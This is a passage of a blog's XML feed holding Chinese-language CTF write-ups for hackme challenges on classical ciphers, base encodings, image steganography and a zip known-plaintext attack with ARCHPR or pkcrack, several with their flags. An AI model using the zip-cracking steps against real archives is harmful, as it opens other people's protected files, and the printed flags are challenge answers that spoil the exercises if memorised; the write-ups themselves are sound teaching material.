XYFG KIFBLCB YZKWFMEKU BWHX RTE RNYNJIHSIG XGYY IWAW GJMUTH RCFMJAEEY VRZ XN PRZVP KA IOSLIHG US DV AESHLD CSFYWB XB MGLY TSMKM TAVMETSV VKZRVKLGTTZW CCTRS ZGISKYRV PD YYI HYGVRC CNLW YL TWALM FQB WZOISPP GQWZLH TQDQMIF VGIC SU QYXKIKLMMGB ETGD PWKAPXL MCI JUOX GLV IIO PUH GTOQVGG R CCOWDS TNEEYAVRVRE ZAYW NIJITMIQXN WL XUMJ WCTPK IOKSG ZSILRV SW VPKJKMCYW FWZSGIESLMV FHK TJO ZOMW GS DEKVIHME C CEFEOP TGHXXSC FEH ENLRTQ CNLW DGZ MSBGG OKTWTRNMJI QQA HRU XIAFKCI</span><br></pre></td></tr></table></figure><p>在线工具很多，直接在线解码即可。<a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a>就是一个不错得到平台，不过这里需要对Key Length设置的长一些。在得到的Result中搜索FLAG字符串，得到flag：<br><img src="./vigenere.PNG" alt="classcipher1"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对经典密码算法维吉尼亚的理解，建议找一本基础密码学的书来学习一下密码学的基本原理！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-classic-cipher-2&quot;&gt;&lt;a href=&quot;#src-hackme-classic-cipher-2&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] classic cipher 2&quot;&gt;&lt;/a&gt;[src = hackme] classic cipher 2&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Solve this vigenere cipher&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="CRYPTO" scheme="http://yoursite.com/categories/CRYPTO/"/>
    
    
      <category term="古典密码" scheme="http://yoursite.com/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"/>
    
      <category term="substitution cipher" scheme="http://yoursite.com/tags/substitution-cipher/"/>
    
      <category term="vigenere" scheme="http://yoursite.com/tags/vigenere/"/>
    
  </entry>
  
  <entry>
    <title>classic cipher 1</title>
    <link href="http://yoursite.com/2019/09/30/classic-cipher-1/"/>
    <id>http://yoursite.com/2019/09/30/classic-cipher-1/</id>
    <published>2019-09-30T00:44:15.000Z</published>
    <updated>2019-09-30T00:54:37.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-classic-cipher-1"><a href="#src-hackme-classic-cipher-1" class="headerlink" title="[src = hackme] classic cipher 1"></a>[src = hackme] classic cipher 1</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MTHJ&#123;CWTNXRJCUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125;</span><br><span class="line">Solve this substitution cipher</span><br></pre></td></tr></table></figure> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目提示是代换密码（substitution cipher），代换密码的种类并不多，在线工具很多，直接在线解码即可。<a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a>就是一个不错得到平台，根据flag的特点：MTHJ应该对应FLAG，可以作为clues使用。<br>即可得到flag：</p><p><img src="./classiccipher1.PNG" alt="classcipher1"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对经典密码算法的理解，建议找一本基础密码学的书来学习一下密码学的基本原理！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-classic-cipher-1&quot;&gt;&lt;a href=&quot;#src-hackme-classic-cipher-1&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] classic cipher 1&quot;&gt;&lt;/a&gt;[src = hackme] classic cipher 1&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;MTHJ&amp;#123;CWTNXRJCUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Solve this substitution cipher&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="CRYPTO" scheme="http://yoursite.com/categories/CRYPTO/"/>
    
    
      <category term="古典密码" scheme="http://yoursite.com/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"/>
    
      <category term="substitution cipher" scheme="http://yoursite.com/tags/substitution-cipher/"/>
    
  </entry>
  
  <entry>
    <title>not hard</title>
    <link href="http://yoursite.com/2019/09/30/not-hard/"/>
    <id>http://yoursite.com/2019/09/30/not-hard/</id>
    <published>2019-09-29T23:57:41.000Z</published>
    <updated>2019-09-30T00:44:44.953Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-not-hard"><a href="#src-hackme-not-hard" class="headerlink" title="[src = hackme] not hard"></a>[src = hackme] not hard</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Nm@rmLsBy&#123;Nm5u-K&#123;iZKPgPMzS2I*lPc%_SMOjQ#O;uV&#123;MM*?PPFhk|Hd;hVPFhq&#123;HaAH&lt;</span><br><span class="line">Tips: pydoc3 base64</span><br></pre></td></tr></table></figure> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出了一段编码，题目提示base64，但显然不是base64编码，通过pydoc查看base64库函数，发现其与base85接近。<br><img src="./base64.PNG" alt="base64"></p><p>直接python脚本对其进行base85解码得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'IZGECR33IRXSA6LPOUQGW3TPO4QGEYLTMUZTEIDFNZRW6ZDJNZTT67I='</span></span><br></pre></td></tr></table></figure><p>发现是base32编码，再次解码得到flag。</p><p>完整解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">c=base64.b85decode(<span class="string">"Nm@rmLsBy&#123;Nm5u-K&#123;iZKPgPMzS2I*lPc%_SMOjQ#O;uV&#123;MM*?PPFhk|Hd;hVPFhq&#123;HaAH&lt;"</span>)</span><br><span class="line">print(c)</span><br><span class="line">print(base64.b32decode(c))</span><br></pre></td></tr></table></figure><p>脚本输出flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'FLAG&#123;Do you know base32 encoding?&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对base编码家族的理解，遇到问题查阅文档也是一个好习惯！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-not-hard&quot;&gt;&lt;a href=&quot;#src-hackme-not-hard&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] not hard&quot;&gt;&lt;/a&gt;[src = hackme] not hard&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Nm@rmLsBy&amp;#123;Nm5u-K&amp;#123;iZKPgPMzS2I*lPc%_SMOjQ#O;uV&amp;#123;MM*?PPFhk|Hd;hVPFhq&amp;#123;HaAH&amp;lt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Tips: pydoc3 base64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="CRYPTO" scheme="http://yoursite.com/categories/CRYPTO/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="base64" scheme="http://yoursite.com/tags/base64/"/>
    
  </entry>
  
  <entry>
    <title>television</title>
    <link href="http://yoursite.com/2019/09/30/television/"/>
    <id>http://yoursite.com/2019/09/30/television/</id>
    <published>2019-09-29T22:36:35.000Z</published>
    <updated>2019-09-29T22:44:22.365Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-television"><a href="#src-hackme-television" class="headerlink" title="[src = hackme] television"></a>[src = hackme] television</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Looks like my television was broken<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>打开是一张图片：<br><img src="./television.bmp" alt="television" title="televison"></p><p>用二进制编辑器010 Editor打开，搜索字符串：Search–&gt;Find Strings:最小长度设置为10，得到flag：<br><img src="./telestr.png" alt="telestr" title="telestr"></p><h2 id="关键字"><a href="#关键字" class="headerlink" title="[关键字]"></a>[关键字]</h2><p>图片信息隐藏，010 Editor</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核二进制编辑器的使用，其他的二进制编辑器还有很多，比如UltraEdit，WinHex；<br>C32ASm是一款非常好用的反汇编程序，其也可以用来进行十六进制编辑</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-television&quot;&gt;&lt;a href=&quot;#src-hackme-television&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] television&quot;&gt;&lt;/a&gt;[src = hackme] television&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;Looks like my television was broken&lt;br&gt;
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="图片信息隐藏" scheme="http://yoursite.com/tags/%E5%9B%BE%E7%89%87%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
    
      <category term="010 Editor" scheme="http://yoursite.com/tags/010-Editor/"/>
    
  </entry>
  
  <entry>
    <title>meow</title>
    <link href="http://yoursite.com/2019/09/29/meow/"/>
    <id>http://yoursite.com/2019/09/29/meow/</id>
    <published>2019-09-29T13:13:06.000Z</published>
    <updated>2019-09-29T22:42:44.626Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-meow"><a href="#src-hackme-meow" class="headerlink" title="[src = hackme] meow"></a>[src = hackme] meow</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Pusheen is cute!<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>打开是一张图片：<br><img src="./meow.png" alt="meow"></p><p>放到KALI里面，用binwalk查看，发现里面包含多个文件：<br><img src="./binwalk.PNG" alt="meow"></p><p>用foremost进行分离，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost meow.png</span><br></pre></td></tr></table></figure><p>得到两个文件夹png和zip，png文件夹下为一张图片00000000.png，zip下为一个压缩包00000094.zip，打开需要密码，因此关键是破解压缩文件夹的密码。<br>首先分析一下该zip压缩包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -v 00000094.zip</span><br></pre></td></tr></table></figure><p>得到<br><img src="./unzip.PNG" alt="unzip"><br>看到该压缩包里包含flag文件和另外一张图片，图片的CRC32为cdad52bd.</p><p>将已经解压得到的图片00000000.png压缩比较CRC32值，发现相同，猜测是同一张图片<br><img src="./zip.PNG" alt="zip"><br>因此可考虑图片的已知明文攻击，大致原理是当你不知道一个zip的密码，但是有zip中的一个已知文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件，此时我们可以尝试用ARCHPR或者pkcrack进行明文攻击。</p><p>在这里我们使用ARCHPR进行破解，如图所示：<br><img src="./ARCHPR.PNG" alt="ARCHPR"><br>在加密的ZIP/RAR/ACE/ARJ文件处选择要破解的压缩包，攻击类型选择明文，在明文文件路径选择我们用zip压缩得到的00.zip。然后开始破解。<br>破解完成后将破解后的压缩包00000094_decrypted.zip解压（ARCHPR得到的是一个已经没有密码的压缩包），打开其中的flag文件，得到flag：<br><img src="./flag.PNG" alt="flag"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>本题考核Linux系统基本命令的使用：binwalk，foremost，unzip，zip等；<br>同时考察压缩包解压密码破解的基本方法：爆破攻击，伪加密，已知明文攻击，本题考察的是已知明文攻击，可用的工具有ARCHPR（Windows）和pkcrack（Linux）。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-meow&quot;&gt;&lt;a href=&quot;#src-hackme-meow&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] meow&quot;&gt;&lt;/a&gt;[src = hackme] meow&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;Pusheen is cute!&lt;br&gt;
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="信息隐藏" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
    
      <category term="pkcrack" scheme="http://yoursite.com/tags/pkcrack/"/>
    
      <category term="APCHPR" scheme="http://yoursite.com/tags/APCHPR/"/>
    
  </entry>
  
  <entry>
    <title>r-u-kidding</title>
    <link href="http://yoursite.com/2019/09/29/r-u-kidding/"/>
    <id>http://yoursite.com/2019/09/29/r-u-kidding/</id>
    <published>2019-09-29T12:37:14.000Z</published>
    <updated>2019-09-29T22:42:44.627Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-r-u-kidding"><a href="#src-hackme-r-u-kidding" class="headerlink" title="[src = hackme] r u kidding"></a>[src = hackme] r u kidding</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>EKZF{Hs’r snnn dzrx, itrs bzdrzq bhogdq}<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>比较容易判断应该是凯撒密码：根据flag格式，则EKZF应该对应FLAG，简单判断就是所有字符向后移动1位，可手动解码，但效率较低。对于这种经典的密码算法，网上有很多现成的在线解码器或离线解码器，直接解码即可，如下图基于<a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">http://ctf.ssleye.com/</a> 在线工具平台的凯撒密码工具在线解密。</p><p><img src="./i.PNG" alt="i"></p><p>当然也可以自己编程解决，再次不再赘述。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对古典密码的理解，凯撒密码是最为古老的密码算法之一</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-r-u-kidding&quot;&gt;&lt;a href=&quot;#src-hackme-r-u-kidding&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] r u kidding&quot;&gt;&lt;/a&gt;[src = hackme] r u kidding&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;EKZF{Hs’r snnn dzrx, itrs bzdrzq bhogdq}&lt;br&gt;
    
    </summary>
    
    
      <category term="CRYPTO" scheme="http://yoursite.com/categories/CRYPTO/"/>
    
    
      <category term="CRYPTO" scheme="http://yoursite.com/tags/CRYPTO/"/>
    
      <category term="凯撒" scheme="http://yoursite.com/tags/%E5%87%AF%E6%92%92/"/>
    
  </entry>
  
  <entry>
    <title>easy</title>
    <link href="http://yoursite.com/2019/09/29/easy/"/>
    <id>http://yoursite.com/2019/09/29/easy/</id>
    <published>2019-09-29T12:26:49.000Z</published>
    <updated>2019-09-29T23:59:10.051Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-easy"><a href="#src-hackme-easy" class="headerlink" title="[src = hackme] easy"></a>[src = hackme] easy</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>526b78425233745561476c7a49476c7a4947566863336b7349484a705a3268305033303d<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出了一段16进制数，使用python3的bytes.fromhex()进行转化发现是base64编码。<br>直接python脚本对其进行base64解码得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">c =<span class="string">"526b78425233745561476c7a49476c7a4947566863336b7349484a705a3268305033303d"</span></span><br><span class="line">print(base64.b64decode(bytes.fromhex(c)))</span><br></pre></td></tr></table></figure><p>程序输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'FLAG&#123;This is easy, right?&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对编码的理解，16进制编码以及使用非常之多的base64，还有基于python编写脚本的能力</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-easy&quot;&gt;&lt;a href=&quot;#src-hackme-easy&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] easy&quot;&gt;&lt;/a&gt;[src = hackme] easy&lt;/h2&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;526b78425233745561476c7a49476c7a4947566863336b7349484a705a3268305033303d&lt;br&gt;
    
    </summary>
    
    
      <category term="CRYPTO" scheme="http://yoursite.com/categories/CRYPTO/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="base64" scheme="http://yoursite.com/tags/base64/"/>
    
  </entry>
  
  <entry>
    <title>corgi-can-fly</title>
    <link href="http://yoursite.com/2019/09/29/corgi-can-fly/"/>
    <id>http://yoursite.com/2019/09/29/corgi-can-fly/</id>
    <published>2019-09-29T06:14:41.000Z</published>
    <updated>2019-09-29T22:42:16.447Z</updated>
    
    <content type="html"><![CDATA[<h2 id="src-hackme-corgi-can-fly"><a href="#src-hackme-corgi-can-fly" class="headerlink" title="[src = hackme] corgi can fly"></a>[src = hackme] corgi can fly</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>Corgi is cute, right?<br> <a id="more"></a><br>Pillow (Python) and Bitmap (.NET) are your friends.</p><p>(Maybe you can try stegsolve)</p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开显示一张图片，典型是一个图片信息隐藏题目：</p><img src="./corgi-can-fly.png" width="400"><p>题目描述已经提示了使用用stegsolve，因此用图片查看工具StegSolve工具打开并查看得到二维码，扫码得到flag：<br><img src="./erweima.PNG" width="400"></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h3><p>StegSolve是一款查看图片隐写的工具，在较为简单的图片隐写题目中常用。关于该工具的使用和原理可参考：<a href="https://www.cnblogs.com/cat47/p/11483478.html" target="_blank" rel="noopener">https://www.cnblogs.com/cat47/p/11483478.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;src-hackme-corgi-can-fly&quot;&gt;&lt;a href=&quot;#src-hackme-corgi-can-fly&quot; class=&quot;headerlink&quot; title=&quot;[src = hackme] corgi can fly&quot;&gt;&lt;/a&gt;[src = hackme] corgi can fly&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h3&gt;&lt;p&gt;Corgi is cute, right?&lt;br&gt;
    
    </summary>
    
    
      <category term="MISC" scheme="http://yoursite.com/categories/MISC/"/>
    
    
      <category term="图片信息隐藏" scheme="http://yoursite.com/tags/%E5%9B%BE%E7%89%87%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/"/>
    
      <category term="StegSolve" scheme="http://yoursite.com/tags/StegSolve/"/>
    
      <category term="MISC" scheme="http://yoursite.com/tags/MISC/"/>
    
  </entry>
  
</feed>
